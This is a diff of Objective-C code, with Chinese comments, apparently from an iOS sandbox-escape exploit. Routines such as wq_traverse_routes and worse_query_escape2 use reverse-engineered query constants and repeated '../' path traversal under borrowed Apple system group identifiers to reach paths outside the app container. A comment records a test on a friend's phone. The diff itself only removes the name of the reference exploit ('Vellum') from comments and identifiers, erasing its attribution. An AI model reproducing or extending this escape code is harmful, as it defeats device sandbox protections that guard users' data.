@@ -170,7 +170,7 @@ static const uint64_t kClass2Flags[] = {
 };
 
 // 免符号链接的试探：查一个组标识（系统组或自己的组），用 part_domain
-// 一路 ../ 穿到目标路径，全程不需要本进程拿到组容器路径。这是从 Vellum
+// 一路 ../ 穿到目标路径，全程不需要本进程拿到组容器路径。这是从参考实现
 // 1.5 拆出来的另一条路（bad_query，同思路重写），常量已照反汇编核对：
 //   class：给了组用 7，不给组用 13；part 固定 3；
 //   flags：0x8000000000（常规）/ 0x800000000（alt）；
@@ -264,7 +264,7 @@ static int64_t wq_attempt(uint64_t query_class, uint64_t flags,
     return handle;
 }
 
-// 免符号链接的穿出路线（Vellum bad_query 思路，常量见上面注释）：
+// 免符号链接的穿出路线（bad_query 思路，常量见上面注释）：
 // class 2 / class 7 用自己的组（8 级 ../），class 13 用系统组（7 级 ../），
 // 逐个试到成功。全失败返回最后一条路的负错误码，out 参数记录最后一次尝试。
 // 2026-11-10 朋友 27.2 手机实测：抽屉好好的、class 7 符号链接路三组全被
@@ -288,7 +288,7 @@ static int64_t wq_traverse_routes(NSString *group, NSString *target,
     // 直接拿系统自带组当身份（systemgroup.com.apple.mobilegestaltcache、
     // group.com.apple.PosterBoard），所以谁的手机都一样。层数按 8/7/9
     // 都试，两套 flags，谁成用谁；全不行再退回签名组的路。
-    NSString *kVellumIds[2] = { @"systemgroup.com.apple.mobilegestaltcache",
+    NSString *kGroupIds[2] = { @"systemgroup.com.apple.mobilegestaltcache",
                                 @"group.com.apple.PosterBoard" };
     int attempt = 0;
     for (int idIdx = 0; idIdx < 2; idIdx++) {
@@ -296,7 +296,7 @@ static int64_t wq_traverse_routes(NSString *group, NSString *target,
             int up = lv == 0 ? 8 : (lv == 1 ? 7 : 9);
             for (int f = 0; f < 2; f++) {
                 uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
-                int64_t h = wq_attempt_traverse(7, flag, up, kVellumIds[idIdx], target,
+                int64_t h = wq_attempt_traverse(7, flag, up, kGroupIds[idIdx], target,
                                                 query_create, query_set_class, query_set_group_identifiers,
                                                 query_set_flags, query_set_part, query_set_part_domain,
                                                 query_get_single_result, query_free,
@@ -455,7 +455,7 @@ int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
         }
     }
 
-    // 第三轮：免符号链接穿出（Vellum 走的路）。抽屉开得好好的也可能被
+    // 第三轮：免符号链接穿出。抽屉开得好好的也可能被
     // 内核拒发扩展（27.2 朋友手机实测 class 7 三组全 -6），这条路照样走。
     // 注意 traverse 不需要符号链接，但上面符号链接路可能留了一个在
     // Library/Caches——无论成败都拆干净。
